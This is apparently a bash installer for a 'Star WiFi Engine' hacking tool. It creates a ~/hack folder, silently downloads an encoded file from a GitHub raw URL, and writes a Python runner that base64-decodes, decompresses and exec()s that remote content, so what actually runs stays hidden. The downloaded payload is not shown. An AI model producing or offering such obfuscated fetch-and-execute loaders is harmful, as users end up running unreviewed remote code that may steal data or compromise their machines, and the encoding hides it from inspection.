#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[0;33m'
RESET='\033[0m'

clear
echo -e "${CYAN}"
echo "╔════════════════════════════════════════╗"
echo "║     Star WiFi Engine Installer         ║"
echo "║        By AlienSoldier                 ║"
echo "╚════════════════════════════════════════╝"
echo -e "${RESET}"

# Create directory
mkdir -p ~/hack
cd ~/hack

# Download encoded file
echo -e "${GREEN}[*] Downloading Star Engine...${RESET}"
curl -sL "https://raw.githubusercontent.com/aliensoldier490-cell/hack/main/star_encoded.txt" -O

# Create runner script
cat > run.py << 'RUNNER'
#!/usr/bin/env python3
import gzip, base64, os, sys

def main():
    if not os.path.exists('star_encoded.txt'):
        print("[!] star_encoded.txt not found!")
        sys.exit(1)
    
    with open('star_encoded.txt', 'r') as f:
        encoded = f.read().strip()
    
    try:
        exec(gzip.decompress(base64.b64decode(encoded)).decode())
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
RUNNER

echo -e "${GREEN}[✓] Installation Complete!${RESET}"
echo -e "${CYAN}[*] Run: cd ~/hack && python3 run.py${RESET}"
